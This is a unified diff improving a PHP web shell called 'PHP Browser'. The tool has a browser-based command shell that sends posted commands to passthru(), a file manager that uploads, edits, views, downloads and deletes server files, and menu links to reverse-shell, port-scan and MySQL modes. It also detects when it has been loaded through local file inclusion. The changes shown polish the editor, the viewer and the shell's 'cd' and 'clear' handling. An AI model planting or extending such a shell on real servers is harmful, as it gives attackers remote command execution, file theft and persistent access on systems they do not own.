@@ -27,7 +27,7 @@ define('DIR', (isset($_GET['d']) ? $_GET['d'] : (isset($_POST['d']) ? $_POST['d'
 define('IS_LFI_BASED', (basename(__FILE__) == basename($_SERVER['SCRIPT_NAME'])) ? false : true);
 define('MODE', (isset($_GET['mode']) ? $_GET['mode'] : (isset($_POST['mode']) ? $_POST['mode'] : 'browser')));
 
-if (function_exists(date_default_timezone_get()))         $TZ = date_default_timezone_get();
+if (function_exists('date_default_timezone_get'))         $TZ = @date_default_timezone_get();
 elseif (strlen(ini_get('date.timezone')))                 $TZ = ini_get('date.timezone');
 elseif (IS_WIN == false AND file_exists('/etc/timezone')) $TZ = file_get_contents('/etc/timezone');
 else                                                      $TZ = 'UTC';
@@ -55,6 +55,10 @@ if (IS_LFI_BASED)
 
 $html_header .= '<html><head><title>PHP Browser</title></head><body>';
 $html_footer = '<body></html>';
+$css = '<style>* {font-family: monospace, sans-serif;font-size: 11px;background-color: #fff;}
+.green {color: #048839;}.red {color:red;}.bold{font-weight: bold}.hdr{display:block;width:100%;padding:5px; text-align:center;}
+.statusbar {position:fixed;bottom:0;width:100%;background-color: #eee; border-top: 1px solid #ccc;margin:0;padding:4px; height:12px;}
+.text {font-family: Arial, sans-serif;font-size: 12px;}table td {padding: 0px 15px 0px 15px;}a {text-decoration: none;}a.plus {font-weight: bold;color: #aaa;}a.linkdir {text-decoration: none;color: #55f;min-height: 32px;}a.menu {font-weight: bold;font-size: 11px;color: #55f;}</style>';
 
 $system_drives = IS_WIN ? system_drives() : '';
 $lf = "\n";
@@ -71,7 +75,7 @@ if (MODE == 'browser' && isset($_FILES['uploaded_file']))
 		//if (file_exists($newname)) unlink($newname);
 
 		if (!file_exists($newname) and move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $newname))
-			$uploaded = '<span style="color: #048839;"><br>File <b>'. $newname .'</b> uploaded.</span>';
+			$uploaded = '<span class="green text"><br>File <b>'. $newname .'</b> uploaded.</span>';
 		else echo "Error";
 	}
 	else echo "Error";
@@ -89,7 +93,7 @@ if (isset($_GET['d']) && isset($_GET['l']))
 	$file = $cwd .'/'. $_GET['l'];
 	$content_type = function_exists('mime_content_type') ? mime_content_type($_GET['l']) : 'application/octet-stream';
 	header('Content-Type: '. $content_type);
-	header('Content-disposition: attachment; filename='. basename($_GET['l']));
+	header('Content-disposition: attachment; filename="'. basename($_GET['l']) .'"');
 	header('Content-Transfer-Encoding: binary');
 	readfile($file);
 	die;
@@ -100,26 +104,43 @@ if (isset($_GET['d']) && isset($_GET['r']))
 {
 	$file = $cwd .'/'. $_GET['r'];
 	if (unlink($file))
-		$deleted = '<br><span style="color: #048839;">File <b>'. $file .'</b> deleted.</span>';
+		$deleted = '<br><span class="green text">File <b>'. $file .'</b> deleted.</span>';
 }
 
 /* Save edited file to disk */
 if (isset($_POST['submit_file']))
 {
+	$eols = array('lfcr' => "\n\r", 'crlf' => "\r\n", 'lf' => "\n", 'cr' => "\r");
 	$file = stripslashes($_POST['filename']);
-	file_put_contents($file, stripslashes($_POST['file_contents']));
-	echo '<br><span style="color:green">File <b>'. $file .'</b> saved.</span><br>';
+	$encoding = stripslashes($_POST['encoding']);
+
+	$contents = @mb_convert_encoding($_POST['file_contents'], $encoding);
+	$contents = preg_replace('~(*BSR_ANYCRLF)\R~', $eols[$_POST['linefeeds']], $contents);
+
+	file_put_contents($file, $contents);
+	echo '<br><span class="green text">File <b>'. $file .'</b> saved.</span><br>';
 }
 
 /* Edit file */
 if (isset($_GET['d']) && isset($_GET['e']))
 {
-	echo '<hr>[ Editing '. stripslashes($cwd .'/'. $_GET['e']) .' ] :<hr>
-	<form name="edit_file" method="post" action"'. SCRIPT_NAME . build_params() .'><textarea cols="130" rows="30" name="file_contents">'. 
-	file_get_contents($_GET['e']) .'</textarea><input type="hidden" name="filename" value="'. stripslashes($cwd .'/'. $_GET['e']) .'" />
-	<br><input type="submit" name="submit_file" value="Write to disk"/ >
-	</form>';
-	die;
+	if (file_exists($_GET['e']))
+	{
+		$text = file_get_contents($_GET['e']);
+		$encoding = @mb_detect_encoding($text);
+		$linefeeds = detect_eol($text);
+
+		echo '<html>'. $css .'<span class="text hdr">'. stripslashes($cwd .'/'. $_GET['e']) .'</span>
+			<form name="edit_file" method="post" action"'. SCRIPT_NAME . build_params() .'><textarea style="border: 1px solid #000;white-space: pre; width: 100%; height: 88%;" name="file_contents">'. 
+			htmlentities($text) .'</textarea><input type="hidden" name="filename" value="'. stripslashes($cwd .'/'. $_GET['e']) .'" />
+			<input type="hidden" name="encoding" value="'. $encoding .'" />
+			<input type="hidden" name="linefeeds" value="'. $linefeeds .'" />
+			<br><input type="submit" name="submit_file" value="Write to disk"/ ><form>
+			<div class="statusbar">Encoding: '. $encoding .' | EOL: '. $linefeeds .' | Size: '. filesize($_GET['e']) .' | '. date('D d M Y, H:i', @filemtime($_GET['e'])) .'</div>
+		</html>';
+		die;
+	}
+	else die('File not found.');
 }
 
 /* View file */
@@ -127,22 +148,14 @@ if (isset($_GET['d']) && isset($_GET['v']))
 {
 	if (file_exists($_GET['v']))
 	{
-		$info = pathinfo($_GET['v']);
-		$content_type = function_exists('mime_content_type') ? mime_content_type($_GET['v']) : 'text/plain';
-		header('Content-Type: '. $content_type);
-		readfile($_GET['v']);
+		echo '<html>
+		<style>html,body{margin:0;}textarea{width:100%;height:100%;margin:0;border:0;resize:none;outline:none;}</style>
+		<body><textarea name="file_contents" readonly="readonly">'. htmlentities(file_get_contents($_GET['v'])) .'</textarea></body>
+		</html>';
 		die;
 	}
 	else die('File not found.');
 }
-
-$css = '<style>* {font-family: monospace, sans-serif;font-size: 11px;}
-.phpinfo {font-family: Arial, sans-serif;font-size: 12px;}
-table td {padding: 0px 15px 0px 15px;}
-a {text-decoration: none;}
-a.plus {font-weight: bold;color: #aaa;}
-a.linkdir {text-decoration: none;color: #55f;min-height: 32px;}
-a.menu {font-weight: bold;font-size: 11px;color: #55f;}</style>';
 
 if (in_array(MODE, array('browser', 'portscan', 'reverse-shell', 'mysql')))
 {
@@ -150,7 +163,7 @@ if (in_array(MODE, array('browser', 'portscan', 'reverse-shell', 'mysql')))
 
 	echo $html_header . $css . '<h4>php browser - '. $id .'</h4><p>'.
 	(MODE == 'browser' ? 'browser' : '<a href="'. SCRIPT_NAME .'?mode=browser'. build_params('mode') .'" class="menu">browser</a>') .' - '. 
-	(MODE == 'shell' ? 'shell' : '<a href="" onclick="javascript:window.open(\''. SCRIPT_NAME .'?mode=shell'. build_params('mode') .'\', \'\', \'width=820,height=385,toolbar=no,scrollbars=no\'); return false;" class="menu">shell</a>') .' - '.
+	(MODE == 'shell' ? 'shell' : '<a href="" onclick="javascript:window.open(\''. SCRIPT_NAME .'?mode=shell'. build_params('mode') .'\', \'\', \'width=820,height=385,toolbar=no,titlebar=no,location=no,scrollbars=no\'); return false;" class="menu">shell</a>') .' - '.
 	(MODE == 'reverse-shell' ? 'reverse-shell' : '<a href="'. SCRIPT_NAME .'?mode=reverse-shell'. build_params('mode') .'" class="menu">reverse-shell</a>') .' - ' .
 	(MODE == 'phpinfo' ? 'phpinfo' : '<a href="'. SCRIPT_NAME .'?mode=phpinfo'. build_params('mode') .'" class="menu">phpinfo</a>') .' - ' .
 	(MODE == 'portscan' ? 'portscan' : '<a href="'. SCRIPT_NAME .'?mode=portscan'. build_params(array('mode')) .'" class="menu">portscan</a>') .' - '.
@@ -160,12 +173,10 @@ if (in_array(MODE, array('browser', 'portscan', 'reverse-shell', 'mysql')))
 /* Display tree */
 if (MODE == 'tree')
 {
-	echo $html_header . $css;
-	$dir = isset($_GET['dir']) ? $_GET['dir'] : '/';
-
-	echo list_dir($dir);
-
-	echo $html_footer;
+	$ret = $html_header . $css;
+	$ret .= list_dir(isset($_GET['dir']) ? $_GET['dir'] : '/');
+	$ret .= $html_footer;
+	die($ret);
 }
 
 /* Display virtual shell */
@@ -180,9 +191,12 @@ if (MODE == 'shell')
 	if (isset($_POST['cmd']))
 	{
 		/* Simulate built-in 'cd' command */
-		if (substr($_POST['cmd'], 0, 3) == 'cd ')
+		if ($_POST['cmd'] == 'cd' or substr($_POST['cmd'], 0, 3) == 'cd ')
 		{
-			$cmd_cd = substr($_POST['cmd'], 3);
+			$cmd_cd = trim(substr($_POST['cmd'], 3));
+
+			if (!strlen($cmd_cd) or $cmd_cd == '~')
+				$cmd_cd = getenv('HOME');
 
 			if (isset($cmd_cd) AND !empty($cmd_cd))
 			{
@@ -214,6 +228,8 @@ if (MODE == 'shell')
 			{
 				case 'l': $cmd = 'ls -lh '. strtok(' '); break ;
 				case 'la': $cmd = 'ls -la '. strtok(' '); break ;
+				#case 'cls':
+				#case 'clear': $cmd = ''; echo str_repeat("\n", 50); break;
 				default: $cmd = $_POST['cmd']; break ;
 			}
 			$cmd_output = passthru($cmd .' 2>&1');
@@ -224,7 +240,7 @@ if (MODE == 'shell')
 	}
 	
 	$uri = (IS_WIN ? str_replace('\\', '/', $_SERVER['SCRIPT_NAME']) : $_SERVER['SCRIPT_NAME']) . '?mode=shell' . build_params('mode');
-	$prompt_prefix = IS_WIN ? '' : exec('whoami') .'@'. exec('hostname') .' ';
+	$prompt_prefix = IS_WIN ? '' : get_current_user() .'@'. gethostname() .' ';
 	$prompt_suffix = IS_WIN ? '> ' : ' $ ';
 
 	echo $html_header . '<style>* {background-color: #333;}html,body {overflow: hidden;margin:0;}
@@ -243,7 +259,7 @@ if (MODE == 'shell')
 	var tcmd = document.getElementById(\'vshell_cmd\');
 
 	function ReadCookie(name) { var parts = document.cookie.split(/;\s*/); for (var i=0;i<parts.length;i++)	{ if (parts[i].substring(0, 3) == name+"=") return atob(unescape(parts[i].substring(3))); } }
-	function checkEnter(e)    { var key; if (window.event)	key = window.event.keyCode; else key = e.which; if (key == 13) { if (tcmd.value == "exit") window.close(); else postMethod(tcmd.value); return true; } else return false; }
+	function checkEnter(e)    { var key; if (window.event)	key = window.event.keyCode; else key = e.which; if (key == 13) { if (tcmd.value == "exit") window.close(); else if (tcmd.value == "clear" || tcmd.value == "cls") {ta.value="";tcmd.value="";} else postMethod(tcmd.value); return true; } else return false; }
 	function updatePrompt()   { vp.innerHTML = "'. $prompt_prefix .'" + ReadCookie(\'cs\') + "'. $prompt_suffix .'"; }
 	function getHTTPObject()  { var http = false; if (typeof ActiveXObject != \'undefined\') {try { http = new ActiveXObject("Msxml2.XMLHTTP"); } catch (e) { try { http = new ActiveXObject("Microsoft.XMLHTTP"); }	catch (E) { http = false;}}} else if (XMLHttpRequest) { try { http = new XMLHttpRequest(); }	catch (e) {http = false;}} return http;	}
 	function postMethod(cmd)  { var http = getHTTPObject(); var params = "cmd="+ cmd.replace(\'+\',\'%2b\'); http.open("POST", "'. $uri .'", true); http.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); 
@@ -436,11 +452,11 @@ if (MODE == 'phpinfo')
 /* Display file browser */
 if (MODE == 'browser')
 {
-	echo '<br><br>
-	<table height=700 border="0">
+	echo '
+	<table border="0">
 	  <tr>
-	    <td style="padding:0;">
-		<iframe src="'. SCRIPT_NAME .'?mode=tree&dir='. $cwd . build_params(array('mode', 'dir')) .'" frameborder="0" width="350" height="100%"></iframe>
+	    <td style="padding:0;vertical-align:top;">
+		<iframe scrolling="no" style="width:100%;border:0;overflow:hidden;" onload="this.style.height=this.contentWindow.document.body.scrollHeight + \'px\';" src="'. SCRIPT_NAME .'?mode=tree&dir='. $cwd . build_params(array('mode', 'dir')) .'"></iframe>
 	    </td>
 	    <td valign="top">';
 
@@ -494,19 +510,20 @@ if (MODE == 'browser')
 				 urlencode($val) . build_params('mode', 'd') .'">'. $val .'</a>';
 		}
 
-		$link_view = IS_LFI_BASED ? 'View' :     '<img src="'. SCRIPT_NAME .'?genimg=view'. build_params(array('genimg')) .'" alt="View" />';
-		$link_edit = IS_LFI_BASED ? 'Edit' :     '<img src="'. SCRIPT_NAME .'?genimg=edit'. build_params(array('genimg')) .'" alt="Edit" />';
-		$link_down = IS_LFI_BASED ? 'Download' : '<img src="'. SCRIPT_NAME .'?genimg=save'. build_params(array('genimg')) .'" alt="Download" />';
+		$link_view = IS_LFI_BASED ? 'View' :     '<img src="'. SCRIPT_NAME .'?genimg=view'.   build_params(array('genimg')) .'" alt="View" />';
+		$link_edit = IS_LFI_BASED ? 'Edit' :     '<img src="'. SCRIPT_NAME .'?genimg=edit'.   build_params(array('genimg')) .'" alt="Edit" />';
+		$link_down = IS_LFI_BASED ? 'Download' : '<img src="'. SCRIPT_NAME .'?genimg=save'.   build_params(array('genimg')) .'" alt="Download" />';
 		$link_dele = IS_LFI_BASED ? 'Delete' :   '<img src="'. SCRIPT_NAME .'?genimg=delete'. build_params(array('genimg')) .'" alt="Delete" />';
 	
 		echo '<tr style="height: 16px;"><td>'. $perms .'</td><td>'. $owner['name'] .'</td><td>'. $group['name'] .'</td>';
 		echo '<td>'. utf8_decode($val) .'</td><td align="right">'. $fsize .'</td><td>'. @date('Y/m/d H:i', $mtime) .'</td>';
+
 		echo '<td>'. (!$is_dir ? 
-			'<a target="_blank" title="View" href="'. $view .'">'. $link_view .'</a> '.
-			'<a target="_blank" title="Edit" href="'. $edit .'">'. $link_edit .'</a> '.
-			'<a title="Save" href="'. $down .'">'. $link_down .'</a> '.
-			'<a title="Delete" href="'. $dele .'">'. $link_dele .'</a> ' : '&nbsp;');
-		echo '</td></tr>'. $lf;	
+			'<a target="_blank" title="View" href="#" onclick="javascript:window.open(\''. $view .'\', \'\', \'width=550,height=700,toolbar=no,titlebar=no,location=no,scrollbars=no\'); return false;">'. $link_view .'</a> '.
+			'<a target="_blank" title="Edit" href="#" onclick="javascript:window.open(\''. $edit .'\', \'\', \'width=550,height=700,toolbar=no,titlebar=no,location=no,scrollbars=no\'); return false;">'. $link_edit .'</a> '.
+			'<a title="Save"   href="'. $down .'">'. $link_down .'</a> '.
+			'<a title="Delete" href="'. $dele .'">'. $link_dele .'</a> ' : '&nbsp;') .'</td>';
+		echo '</tr>'. $lf;	
 	}
 	echo '</table>';
 
@@ -653,6 +670,24 @@ function print_tree_line($dir, $str, $space = '')
 		<a href="'. SCRIPT_NAME .'?mode=browser&d='. $dir . build_params(array('mode', 'dir')) .'" class="linkdir" target="_top">'. utf8_decode($str) ."</a><br>\n";
 }
 
+// Detects line feed type
+function detect_eol($str)
+{
+	$eols = array('lfcr' => "\n\r", 'crlf' => "\r\n", 'lf' => "\n", 'cr' => "\r");
+
+	$key = '';
+	$cur_count = 0;
+	foreach ($eols as $k => $eol)
+	{
+		if (($count = substr_count($str, $eol)) > $cur_count)
+		{
+			$cur_count = $count;
+			$key = $k;
+		}
+	}
+	return $key;
+}
+
 // Lists files in a directory
 function list_dir($dir, $nr = 0)
 {
@@ -669,7 +704,6 @@ function list_dir($dir, $nr = 0)
 	
 	$top_dir = IS_WIN ? strtolower($arbo[0]) : '/';
 
-	//echo "scanning $curdir <br>";
 	if (IS_WIN && $nr == 0)
 	{
 		foreach ($system_drives as $letter)
@@ -704,7 +738,7 @@ function list_dir($dir, $nr = 0)
 function system_drives()
 {
 	$drives = array();
-	for ($ii=66;$ii<92;$ii++) 
+	for ($ii = 66; $ii < 92; $ii++) 
 	{
 		$char = chr($ii);
 		if (is_dir($char.":/"))
@@ -841,4 +875,3 @@ function get_services()
 	return unserialize(bzdecompress(base64_decode($services)));
 }
 ?>
-
